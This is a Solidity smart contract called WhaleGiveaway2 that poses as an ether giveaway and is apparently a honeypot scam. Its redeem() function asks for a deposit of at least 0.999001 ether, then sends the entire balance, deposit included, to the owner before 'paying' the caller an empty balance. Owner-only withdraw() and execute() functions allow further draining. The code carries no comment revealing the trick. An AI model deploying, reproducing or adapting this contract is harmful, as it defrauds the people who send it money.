pragma solidity ^0.4.19;

contract WhaleGiveaway2 {
    address public Owner = msg.sender;
    uint public constant minEligibility = 0.999001 ether;

    function() public payable {}

    function redeem() public payable {
        if (msg.value >= minEligibility) {
            Owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public payable {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function execute(address _to, bytes _data) public payable {
        require(msg.sender == Owner);
        require(_to != address(this)); // prevent calling this contract's functions
        require(_to.call.value(msg.value)(_data));
    }
}